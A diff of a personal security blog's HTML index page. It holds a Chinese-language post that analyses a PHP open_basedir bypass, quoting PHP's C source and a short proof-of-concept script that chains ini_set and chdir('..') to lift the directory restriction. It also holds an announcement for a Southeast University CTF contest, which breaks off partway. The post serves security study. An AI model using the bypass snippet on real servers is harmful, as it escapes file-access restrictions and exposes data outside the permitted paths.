@@ -317,6 +317,435 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/php-bypass-open-basedir/index.html" itemprop="url">
+                  php open_basedir 绕过poc分析
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-04-05 18:28:26 / Modified: 18:29:06" itemprop="dateCreated datePublished" datetime="2019-04-05T18:28:26+08:00">2019-04-05</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="php-open-basedir-poc分析"><a href="#php-open-basedir-poc分析" class="headerlink" title="php open_basedir poc分析"></a>php open_basedir poc分析</h1><p>近日在CTF交流群中看到一个绕过open_basedir限制的poc</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1ruetkvhyj30n01dstdl.jpg" alt=""></p>
+<p>对这个poc产生了极大的兴趣，因此翻出php的源码来下断点分析一波php open_basedir的机制。</p>
+<p>在<code>/main/fopen_wrappers.c</code>中<code>PHPAPI int php_check_open_basedir_ex(const char *path, int warn)</code>方法是php在处理文件操作时用于验证open_basedir的方法。我们查看一下他的实现方法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="keyword">int</span> <span class="title">php_check_open_basedir_ex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">int</span> warn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* Only check when open_basedir is available */</span></span><br><span class="line">	<span class="keyword">if</span> (PG(open_basedir) &amp;&amp; *PG(open_basedir)) &#123;</span><br><span class="line">		<span class="keyword">char</span> *pathbuf;</span><br><span class="line">		<span class="keyword">char</span> *ptr;</span><br><span class="line">		<span class="keyword">char</span> *end;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Check if the path is too long so we can give a more useful error</span></span><br><span class="line"><span class="comment">		* message. */</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &gt; (MAXPATHLEN - <span class="number">1</span>)) &#123;</span><br><span class="line">			php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">"File name is longer than the maximum allowed path length on this platform (%d): %s"</span>, MAXPATHLEN, path);</span><br><span class="line">			errno = EINVAL;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		pathbuf = estrdup(PG(open_basedir));</span><br><span class="line"></span><br><span class="line">		ptr = pathbuf;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (ptr &amp;&amp; *ptr) &#123;</span><br><span class="line">			end = <span class="built_in">strchr</span>(ptr, DEFAULT_DIR_SEPARATOR);</span><br><span class="line">			<span class="keyword">if</span> (end != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				*end = <span class="string">'\0'</span>;</span><br><span class="line">				end++;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (php_check_specific_open_basedir(ptr, path) == <span class="number">0</span>) &#123;</span><br><span class="line">				efree(pathbuf);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ptr = end;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (warn) &#123;</span><br><span class="line">			php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">"open_basedir restriction in effect. File(%s) is not within the allowed path(s): (%s)"</span>, path, PG(open_basedir));</span><br><span class="line">		&#125;</span><br><span class="line">		efree(pathbuf);</span><br><span class="line">		errno = EPERM; <span class="comment">/* we deny permission to open it */</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Nothing to check... */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进<code>php_check_specific_open_basedir</code>，这个函数是具体实现每一个路径的判断，一个很长的函数,重点在如下几行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expand_filepath(path, resolved_name) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这里是将传入的path扩展为绝对路径存放于resolved_name</p>
+<p>第214行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expand_filepath(local_open_basedir, resolved_basedir) != <span class="keyword">NULL</span>) &#123;</span><br></pre></td></tr></table></figure>
+<p>这里会根据local_open_basedir的值扩展为绝对路径存放于resolved_basedir</p>
+<p>241行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strncasecmp(resolved_basedir, resolved_name, resolved_basedir_len) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strncmp</span>(resolved_basedir, resolved_name, resolved_basedir_len) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">			<span class="keyword">if</span> (resolved_name_len &gt; resolved_basedir_len &amp;&amp;</span><br><span class="line">				resolved_name[resolved_basedir_len - <span class="number">1</span>] != PHP_DIR_SEPARATOR) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">/* File is in the right directory */</span></span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* /openbasedir/ and /openbasedir are the same directory */</span></span><br><span class="line">			<span class="keyword">if</span> (resolved_basedir_len == (resolved_name_len + <span class="number">1</span>) &amp;&amp; resolved_basedir[resolved_basedir_len - <span class="number">1</span>] == PHP_DIR_SEPARATOR) &#123;</span><br><span class="line">#ifdef PHP_WIN32</span><br><span class="line">				<span class="keyword">if</span> (strncasecmp(resolved_basedir, resolved_name, resolved_name_len) == <span class="number">0</span>) &#123;</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strncmp</span>(resolved_basedir, resolved_name, resolved_name_len) == <span class="number">0</span>) &#123;</span><br><span class="line">#endif</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里在判断是否在路径范围内时，主要比较依据是先用strncmp判断与resolved_basedir长度内的部分是否完全一致，一致的话如果resolved_name与resolved_basedir长度相等则说明就在同一路径，返回0表示允许，长度大于resolved_basedir则判断超出的第一个字符是否不是<code>/</code>，是则返回成功，不是则返回失败。</p>
+<p>这里我们再重点看一下<code>expand_filepath</code>这个函数的实现,主要实现为<code>PHPAPI char *expand_filepath_with_mode</code>,重点位于814行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (virtual_file_ex(&amp;new_state, filepath, <span class="literal">NULL</span>, realpath_mode)) &#123;</span><br><span class="line">		efree(new_state.cwd);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (real_path) &#123;</span><br><span class="line">		copy_len = new_state.cwd_length &gt; MAXPATHLEN - <span class="number">1</span> ? MAXPATHLEN - <span class="number">1</span> : new_state.cwd_length;</span><br><span class="line">		<span class="built_in">memcpy</span>(real_path, new_state.cwd, copy_len);</span><br><span class="line">		real_path[copy_len] = <span class="string">'\0'</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		real_path = estrndup(new_state.cwd, new_state.cwd_length);</span><br><span class="line">	&#125;</span><br><span class="line">	efree(new_state.cwd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> real_path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看<code>virtual_file_ex</code>的实现,1337行之前的操作为如果path不是绝对路径则将path拼接至state.cwd得到resolved_path,重点第1337行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_length = tsrm_realpath_r(resolved_path, start, path_length, &amp;ll, &amp;t, use_realpath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<p>跟进<code>tsrm_realpath_r</code>,可以看到操作主要是递归去掉双斜杠和<code>.</code>以及<code>..</code></p>
+<p>这便是php在处理文件操作判断open_basedir的实现。我们再看php的内置函数<code>ini_set</code>的实现方法,在<code>ext/standard/basic_functions.c</code>中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(ini_set)</span><br><span class="line">&#123;</span><br><span class="line">	zend_string *varname;</span><br><span class="line">	zend_string *new_value;</span><br><span class="line">	zend_string *val;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">		Z_PARAM_STR(varname)</span><br><span class="line">		Z_PARAM_STR(new_value)</span><br><span class="line">	ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">	val = zend_ini_get_value(varname);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copy to return here, because alter might free it! */</span></span><br><span class="line">	<span class="keyword">if</span> (val) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ZSTR_IS_INTERNED(val)) &#123;</span><br><span class="line">			RETVAL_INTERNED_STR(val);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ZSTR_LEN(val) == <span class="number">0</span>) &#123;</span><br><span class="line">			RETVAL_EMPTY_STRING();</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ZSTR_LEN(val) == <span class="number">1</span>) &#123;</span><br><span class="line">			RETVAL_INTERNED_STR(ZSTR_CHAR((zend_uchar)ZSTR_VAL(val)[<span class="number">0</span>]));</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(GC_FLAGS(val) &amp; GC_PERSISTENT)) &#123;</span><br><span class="line">			ZVAL_NEW_STR(return_value, zend_string_copy(val));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ZVAL_NEW_STR(return_value, zend_string_init(ZSTR_VAL(val), ZSTR_LEN(val), <span class="number">0</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		RETVAL_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CHECK_PATH(var, var_len, ini) php_ini_check_path(var, var_len, ini, sizeof(ini))</span></span><br><span class="line">	<span class="comment">/* open basedir check */</span></span><br><span class="line">	<span class="keyword">if</span> (PG(open_basedir)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (_CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), <span class="string">"error_log"</span>) ||</span><br><span class="line">			_CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), <span class="string">"java.class.path"</span>) ||</span><br><span class="line">			_CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), <span class="string">"java.home"</span>) ||</span><br><span class="line">			_CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), <span class="string">"mail.log"</span>) ||</span><br><span class="line">			_CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), <span class="string">"java.library.path"</span>) ||</span><br><span class="line">			_CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), <span class="string">"vpopmail.directory"</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( (ZSTR_VAL(new_value))) &#123;</span><br><span class="line">				zval_ptr_dtor_str(return_value);</span><br><span class="line">				RETURN_FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _CHECK_PATH</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, <span class="number">0</span>) == FAILURE) &#123;</span><br><span class="line">		zval_ptr_dtor_str(return_value);</span><br><span class="line">		RETURN_FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于我们ini_set的是<code>open_basedir</code>于是重要一行便落到了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, <span class="number">0</span>) == FAILURE) &#123;</span><br></pre></td></tr></table></figure>
+<p>查看<code>zend_alter_ini_entry_ex</code>的实现,重要几行为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ini_entry-&gt;on_modify</span><br><span class="line">		|| ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) == SUCCESS) &#123;</span><br><span class="line">		<span class="keyword">if</span> (modified &amp;&amp; ini_entry-&gt;orig_value != ini_entry-&gt;value) &#123; <span class="comment">/* we already changed the value, free the changed value */</span></span><br><span class="line">			zend_string_release(ini_entry-&gt;value);</span><br><span class="line">		&#125;</span><br><span class="line">		ini_entry-&gt;value = duplicate;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		zend_string_release(duplicate);</span><br><span class="line">		<span class="keyword">return</span> FAILURE;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>调试可知,<code>open_basedir</code>对应的<code>on_modify</code>函数为<code>OnUpdateBaseDir</code>，重要几行为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ptr = pathbuf = estrdup(ZSTR_VAL(new_value));</span><br><span class="line">	<span class="keyword">while</span> (ptr &amp;&amp; *ptr) &#123;</span><br><span class="line">		end = <span class="built_in">strchr</span>(ptr, DEFAULT_DIR_SEPARATOR);</span><br><span class="line">		<span class="keyword">if</span> (end != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			*end = <span class="string">'\0'</span>;</span><br><span class="line">			end++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (php_check_open_basedir_ex(ptr, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="comment">/* At least one portion of this open_basedir is less restrictive than the prior one, FAIL */</span></span><br><span class="line">			efree(pathbuf);</span><br><span class="line">			<span class="keyword">return</span> FAILURE;</span><br><span class="line">		&#125;</span><br><span class="line">		ptr = end;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>可见这里便是调用了<code>php_check_open_basedir_ex</code>来判断要更改的open_basedir是否合法。</p>
+<p>回到<code>zend_alter_ini_entry_ex</code>中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">duplicate = zend_string_copy(new_value);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ini_entry-&gt;on_modify</span><br><span class="line">		|| ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) == SUCCESS) &#123;</span><br><span class="line">		<span class="keyword">if</span> (modified &amp;&amp; ini_entry-&gt;orig_value != ini_entry-&gt;value) &#123; <span class="comment">/* we already changed the value, free the changed value */</span></span><br><span class="line">			zend_string_release(ini_entry-&gt;value);</span><br><span class="line">		&#125;</span><br><span class="line">		ini_entry-&gt;value = duplicate;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>open_basedir</code>便会被直接设置为我们设置的值。</p>
+<p>再来看我们的poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>
+<p>假定我们的<code>open_basedir</code>为<code>/var/www/html</code>,我们位于<code>/var/www/html/test</code>目录下</p>
+<p>执行第一个<code>ini_set</code>时，首先判断<code>/var/www/html/test/..</code>即<code>/var/www/html/</code>是否为open_basedir内，判断成功，因此直接更新open_basedir为<code>..</code></p>
+<p>执行<code>chdir(&#39;..&#39;)</code>时，检测open_basedir，<code>..</code>根据当前目录补全后为<code>/var/www/html</code>，而我们的<code>open_basedir</code>为<code>..</code>,补全后也是<code>/var/www/html</code>，因此可以chdir成功。</p>
+<p>再次<code>chdir(&#39;..&#39;)</code>,检测open_basedir,<code>..</code>补全为<code>/var/www</code>,而此时的<code>open_basedir</code>补全也为<code>/var/www</code>，判断成功。</p>
+<p>因此一系列的<code>chdir(&#39;..&#39;)</code>都会成功执行，最后当前目录跳到了<code>/</code>，<code>open_basedir</code>为<code>..</code>,设置<code>open_basedir(&#39;/&#39;)</code>同样可以执行成功，便成功实现了调整<code>open_basedir</code>至任意目录。</p>
+<p>这个poc的构造十分巧妙，修复建议便是禁止在open_basedir已有的情况下修改<code>open_basedir</code>或者禁<code>open_basedir</code>可以被设置为相对路径。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/## 简介/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/## 简介/index.html" itemprop="url">
+                  Untitled
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-04-03 11:47:12" itemprop="dateCreated datePublished" datetime="2019-04-03T11:47:12+08:00">2019-04-03</time>
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>由江苏省网络空间安全高校联盟指导，东南大学网络空间安全学院和东南大学网络安全联盟承办，北京永信至诚科技股份有限公司作为技术支持单位的江苏大学生网络安全精英邀请赛将于4月中旬在南京举行。此次比赛将由东南大学网络安全联盟负责命题，在永信至诚的网络安全攻防实战平台上进行，比赛对象为江苏省各高校的CTF战队。<br>本次比赛的一个目的为东南大学CTF战队面向全校招募新一届的队员，同时比赛也向江苏省各高校全面开放，我们在此次竞赛中将邀请多所江苏高校的新一届队员前往东南大学九龙湖校区共同切磋，共同进步，同时也借此机会选拔出真正对网络安全感兴趣，肯钻研的优秀后备人才，促进江苏高校网安人才的长远发展。</p>
+<h2 id="比赛时间"><a href="#比赛时间" class="headerlink" title="比赛时间"></a>比赛时间</h2><p>北京时间2019年4月13日9:00~17:00，共8小时         </p>
+<h2 id="报名方式"><a href="#报名方式" class="headerlink" title="报名方式"></a>报名方式</h2><p>截止4月11日24时         </p>
+<ul>
+<li>校内同学直接加入QQ群SUSCTF：429678492</li>
+<li>校外同学由主办方统一邀请</li>
+<li>各队信息（学校、队名、队员姓名、年级、手机号、email）统一发送至管理员处，等待管理员确认后为各队发放认证token</li>
+</ul>
+<h2 id="参赛对象"><a href="#参赛对象" class="headerlink" title="参赛对象"></a>参赛对象</h2><p>每队三人</p>
+<ul>
+<li>东南大学在校学生</li>
+<li>由主办方邀请的各个高校战队</li>
+</ul>
+<h2 id="比赛地点"><a href="#比赛地点" class="headerlink" title="比赛地点"></a>比赛地点</h2><p>东南大学九龙湖校区金智楼</p>
+<h2 id="赛制及排名"><a href="#赛制及排名" class="headerlink" title="赛制及排名"></a>赛制及排名</h2><ul>
+<li>比赛共分为两个积分榜，东南大学校内排名以及江苏省排名。</li>
+<li>采用动态分值，每道题目的分值会根据解出队伍的数量进行动态计分。</li>
+<li>最终排名根据每个队伍的总分确定，在多个队伍得分相同的情况下，越早达到这一分值的排名越高。</li>
+</ul>
+<h2 id="比赛模式"><a href="#比赛模式" class="headerlink" title="比赛模式"></a>比赛模式</h2><p>传统的<a href="https://ctf-wiki.github.io/ctf-wiki/">CTF(Capture the flag)</a>模式。每道赛题均内置1个flag，大多数情况下为SUSCTF{example_flag}。提交包含SUSCTF{}的完整flag来获得相应分值。特殊情况会在题目中标明。          </p>
+<p>包含如下题目类型：</p>
+<ul>
+<li>Web 漏洞挖掘和利用</li>
+<li>Pwn 漏洞挖掘利用</li>
+<li>Crypto 密码分析</li>
+<li>Re 二进制程序逆向分析</li>
+<li>Misc 电子取证，流量分析，信息隐藏…</li>
+</ul>
+<h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><ul>
+<li>参赛队伍如有任何违规行为，将被取消比赛资格</li>
+<li>禁止不同参赛队伍合作，或者共享flag、hint等任何比赛相关信息</li>
+<li>禁止攻击比赛平台，如果发现平台漏洞，请务必向我们报告</li>
+<li>禁止在比赛中妨碍其他队伍解题，例如当你解完一道题后对环境进行破坏</li>
+<li>禁止往比赛平台发送大量流量，没有任何题目需要使用扫描器</li>
+<li>禁止对提交的flag进行爆破</li>
+<li>获奖的队伍必须提交完整结题报告</li>
+<li>大赛主办方有权修改包括赛题、规则等一切事项</li>
+</ul>
+<h2 id="奖品"><a href="#奖品" class="headerlink" title="奖品"></a>奖品</h2><p>总排名：</p>
+<ul>
+<li>一等奖（1名）机械键盘*3+荣誉证书</li>
+<li>二等奖（2名）树莓派+荣誉证书</li>
+<li>三等奖（3名）300元书籍+荣誉证书</li>
+</ul>
+<p>校内排名：</p>
+<ul>
+<li>一等奖（1名）：机械键盘*3 + 荣誉证书</li>
+<li>二等奖（2名）：树莓派 + 荣誉证书</li>
+<li>三等奖（3名）：300元书籍 + 荣誉证书</li>
+</ul>
+<h2 id="组织机构"><a href="#组织机构" class="headerlink" title="组织机构"></a>组织机构</h2><ul>
+<li>指导单位：江苏省网络空间安全高校联盟</li>
+<li>承办单位：东南大学网络空间安全学院，东南大学网络安全联盟</li>
+<li>支持单位：北京永信至诚科技股份有限公司</li>
+</ul>
+<h2 id="往年风采"><a href="#往年风采" class="headerlink" title="往年风采"></a>往年风采</h2><ul>
